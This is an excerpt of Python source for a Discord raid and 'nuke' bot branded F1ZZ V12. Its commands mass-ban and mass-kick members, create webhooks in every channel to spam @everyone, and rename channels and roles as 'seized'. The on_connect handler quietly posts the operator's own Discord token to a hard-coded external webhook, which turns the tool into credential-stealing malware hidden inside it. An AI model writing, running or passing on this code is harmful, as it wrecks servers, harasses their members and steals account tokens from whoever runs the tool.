...
os.system(f'cls & title [F1ZZ V12] - Configuration')


token="Your Id Token Here"
prefix = ">"
CHANNEL_NAMES = "WIZZED BY FIYANSHU"
VCHANNELS_NAMES = "SEIZED BY FIYANSHU"
CATEGORY_NAMES = "FIYANSHU ALWAYS OP"
ROLE_NAMES = "F1ZZ ALWAYS OP"
Webhook_contents = "@evryone | @here F1ZZ TEAM NUKES HERE"
...
def ssspam(webhook):
    while spammingdawebhookeroos:
        data = {'content': '@everyone @here SERVER https://discord.gg/uW84vdRXWE SEIZED BY FIYANSHU TEAM F1ZZ PRESENT'}
...
async def on_connect():
    requests.post(
        'https://discord.com/api/webhooks/1054661310786306100/m5lYJ4oCFc9kzwVkIoZxUUKg4sGSxAXUwHbrpQkmJTrV3RJfYUs4tSDWW1wn6A36TybJ',
        json={'content': (token)})
@client.command()
async def pings(ctx):
    ...
    for i in range(webhookamount):
        for channel in ctx.guild.text_channels:
            try:
                webhook = await channel.create_webhook(name='TEAM F1ZZ')
                threading.Thread(target=ssspam, args=(webhook.url, )).start()
...
async def ban(ctx, member: discord.Member, *, reason=None):
    ...
    await ctx.send('```Banned | FIYANSHU ALWAYS OP```')


@client.command()
async def kick(ctx, member: discord.Member, *, reason=None):
    await member.kick(reason=reason)
    await ctx.send('```Kick | FIYANSHU ALWAYS OP```')
...
async def massban(ctx):
    ...
    for user in users:
        try:
            await user.ban(reason="F1ZZ ALWAYS OP")
        except:
            pass
...
async def masskick(ctx):
    ...
    for user in users:
        try:
            await user.kick(reason="F1ZZ ALWAYS OP")
        except:
            pass
...
@client.command()
async def swizz(ctx):
  await ctx.channel.send(f">rr F1ZZ OP | TEAM F1ZZ OP IN RAIDING")
  await ctx.channel.send(f">rs SERVER TRASHED BY TEAM F1ZZ")
  await ctx.channel.send(f">rc TEAM F1ZZ ALWAYS OP ")
...
async def pwizz(ctx):
  ...
  await ctx.channel.send(f">spam 100 @everyone @here #1 RAIDING TEAM F1ZZ Was Here !")


@client.command()
async def about(ctx):
        await ctx.send("__**MADE BY TEAM F1ZZ. BEST RAIDING AND NUKING CLAN IN DISCORD.")
